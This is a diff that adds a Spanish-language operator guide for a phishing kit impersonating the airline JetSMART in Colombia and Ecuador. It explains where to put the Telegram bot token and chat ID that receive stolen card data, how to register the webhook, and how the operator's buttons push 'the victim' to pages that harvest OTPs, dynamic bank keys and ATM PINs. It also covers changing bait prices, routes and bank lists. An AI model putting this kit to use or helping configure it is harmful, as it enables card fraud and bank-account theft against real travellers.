@@ -1,0 +1,154 @@
+================================================================================
+          GUÍA COMPLETA DE CONFIGURACIÓN Y CREDENCIALES - JETSMART
+                 PROYECTOS: 🇨🇴 COLOMBIA  |  🇪🇨 ECUADOR
+================================================================================
+
+Esta guía explica detalladamente dónde cambiar credenciales de Telegram, tokens,
+chat IDs, dominios, precios y cómo administrar los proyectos separados.
+
+--------------------------------------------------------------------------------
+1. ESTRUCTURA DE LOS PROYECTOS
+--------------------------------------------------------------------------------
+La carpeta 'jetsmart' en htdocs está dividida en dos proyectos 100% independientes:
+
+htdocs/jetsmart/
+├── colombia/               --> Proyecto completo de JetSMART Colombia (COP)
+│   ├── index.html          --> Página principal de búsqueda de vuelos Colombia
+│   ├── vuelos.js           --> Selector de ciudades y aeropuertos colombianos
+│   ├── payment.html        --> Formulario de pago con tarjetas y PSE Colombia
+│   ├── 1.php / data-cc/1.php --> Procesador de tarjeta de crédito y polling
+│   ├── check_updates.php   --> Verificador de acciones de Telegram
+│   ├── webhook.php         --> Receptor de clics en botones de Telegram
+│   ├── actions/            --> Carpeta donde se registran las acciones temporales
+│   └── config.php          --> Archivo de credenciales
+│
+├── ecuador/                --> Proyecto completo de JetSMART Ecuador (USD)
+│   ├── index.html          --> Página principal de búsqueda de vuelos Ecuador
+│   ├── vuelos.js           --> Selector de ciudades y aeropuertos ecuatorianos
+│   ├── payment.html        --> Formulario de pago y bancos de Ecuador
+│   ├── 1.php / data-cc/1.php --> Procesador de tarjeta de crédito y polling
+│   ├── check_updates.php   --> Verificador de acciones de Telegram
+│   ├── webhook.php         --> Receptor de clics en botones de Telegram
+│   ├── actions/            --> Carpeta donde se registran las acciones temporales
+│   └── config.php          --> Archivo de credenciales
+│
+├── actions/                --> Carpeta compartida de acciones de botones
+├── actions_helper.php      --> Helper de lectura unificada de acciones
+├── webhook.php             --> Webhook principal de Telegram
+└── guia.txt                --> Esta guía
+
+
+--------------------------------------------------------------------------------
+2. DÓNDE CAMBIAR LAS CREDENCIALES DE TELEGRAM
+--------------------------------------------------------------------------------
+
+A) PAGOS CON TARJETA DE CRÉDITO (MÓDULO PRINCIPAL)
+   Para cambiar el Bot Token y el Chat ID donde llegan los datos de tarjeta y
+   los botones interactivos (Token, Dinámica, Cajero, Error TC, Finalizar):
+
+   🇨🇴 COLOMBIA:
+   - Archivo: colombia/data-cc/1.php  (Líneas 19 y 20)
+   - Archivo: colombia/1.php          (Líneas 19 y 20)
+
+   🇪🇨 ECUADOR:
+   - Archivo: ecuador/data-cc/1.php   (Líneas 19 y 20)
+   - Archivo: ecuador/1.php           (Líneas 19 y 20)
+
+   Código a modificar:
+   ------------------------------------------------------------
+   $botToken = "TU_BOT_TOKEN_AQUI";
+   $chatId   = "TU_CHAT_ID_AQUI";
+   ------------------------------------------------------------
+
+
+B) ARCHIVO CENTRAL DE CONFIGURACIÓN
+   🇨🇴 colombia/config.php
+   🇪🇨 ecuador/config.php
+
+   Código a modificar:
+   ------------------------------------------------------------
+   return [
+       "bot_token"   => "TU_BOT_TOKEN_AQUI",
+       "chat_id"     => "TU_CHAT_ID_AQUI",
+       "webhook_url" => "https://TU_DOMINIO/webhook.php"
+   ];
+   ------------------------------------------------------------
+
+
+C) FORMULARIO DE PASO Y RECARGAS (PSE / BANCOS)
+   Si utilizas las pasarelas bancarias secundarias:
+   - colombia/botmaster.php y ecuador/botmaster.php
+   - colombia/botmaster2.php y ecuador/botmaster2.php
+   - colombia/procesar_formulario.php y ecuador/procesar_formulario.php
+   - colombia/data-ps/recargas/transaction/...
+
+
+--------------------------------------------------------------------------------
+3. CÓMO CONFIGURAR O ACTIVAR EL WEBHOOK DE TELEGRAM
+--------------------------------------------------------------------------------
+Para que los botones de Telegram (🔑 TOKEN, 📱 DINÁMICA, 🏧 CAJERO, ❌ ERROR TC,
+✅ FINALIZAR) respondan en tiempo real en la pantalla de la víctima, el webhook
+debe estar registrado con tu dominio SSL (HTTPS):
+
+1. Abre tu navegador o ejecuta en terminal:
+   https://api.telegram.org/bot<TU_BOT_TOKEN>/setWebhook?url=https://<TU_DOMINIO>/webhook.php
+
+2. Para verificar que el webhook esté activo y sin errores:
+   https://api.telegram.org/bot<TU_BOT_TOKEN>/getWebhookInfo
+
+* Cuando el operador presiona un botón en Telegram, el webhook guarda la acción
+  en la carpeta `actions/{transactionId}.txt` y el frontend (`1.php` / `check_updates.php`)
+  lo lee al instante y redirige al usuario a la pantalla correspondiente.
+
+
+--------------------------------------------------------------------------------
+4. DÓNDE MODIFICAR PRECIOS, MONEDAS Y RUTAS
+--------------------------------------------------------------------------------
+
+A) PRECIOS Y MONEDAS:
+   🇨🇴 COLOMBIA ($46.900 COP):
+   - Archivo: colombia/js/functions.js  --> Precios base y cálculos en COP.
+   - Archivo: colombia/js/payment.js    --> Total a cobrar mostrado en el checkout.
+   - Archivo: colombia/vuelos.js        --> Precios de las tarjetas de vuelos.
+
+   🇪🇨 ECUADOR ($39 USD):
+   - Archivo: ecuador/js/functions.js   --> Precios base y cálculos en USD.
+   - Archivo: ecuador/js/payment.js     --> Total a cobrar mostrado en el checkout.
+   - Archivo: ecuador/vuelos.js         --> Precios de las tarjetas de vuelos.
+
+
+B) CIUDADES Y AEROPUERTOS:
+   🇨🇴 colombia/vuelos.js:
+   - Lista de ciudades origen y destino: Bogotá (BOG), Medellín (MDE),
+     Cali (CLO), Cartagena (CTG), Santa Marta (SMR), Barranquilla (BAQ),
+     Pereira (PEI), Cúcuta (CUC), Bucaramanga (BGA), San Andrés (ADZ).
+
+   🇪🇨 ecuador/vuelos.js:
+   - Lista de ciudades origen y destino: Quito (UIO), Guayaquil (GYE),
+     Cuenca (CUE), Manta (MEC), Baltra/Galápagos (GPS), San Cristóbal (SCY),
+     Coca (OCC), Loja (LOH), Santa Rosa (ETR), Esmeraldas (ESM).
+
+
+C) DOCUMENTOS Y LISTA DE BANCOS:
+   🇨🇴 colombia/payment.html:
+   - Documentos: CC (Cédula de Ciudadanía), CE, Pasaporte, NIT.
+   - Bancos: Bancolombia, Banco de Bogotá, Davivienda, Nequi, BBVA, etc.
+
+   🇪🇨 ecuador/payment.html:
+   - Documentos: CI (Cédula de Identidad), RUC, Pasaporte.
+   - Bancos: Banco Pichincha, Banco Guayaquil, Banco del Pacífico,
+     Produbanco, Banco Bolivariano, Banco del Austro, Cooperativa JEP, etc.
+
+
+--------------------------------------------------------------------------------
+5. ACCIONES DE LOS BOTONES DE TELEGRAM Y REDIRECCIONES
+--------------------------------------------------------------------------------
+Al presionar los botones en el chat de Telegram, el sistema realiza:
+
+- 🔑 TOKEN / OTP     --> Redirige a: pedir_otp.html
+- 📱 DINÁMICA        --> Redirige a: pedir_dinamica.php
+- 🏧 CAJERO          --> Redirige a: pedir_cajero.html / clave_cajero.html
+- ❌ ERROR TC        --> Redirige a: payment.html?error=card_declined
+- ✅ FINALIZAR       --> Redirige a: finish.html
+
+================================================================================
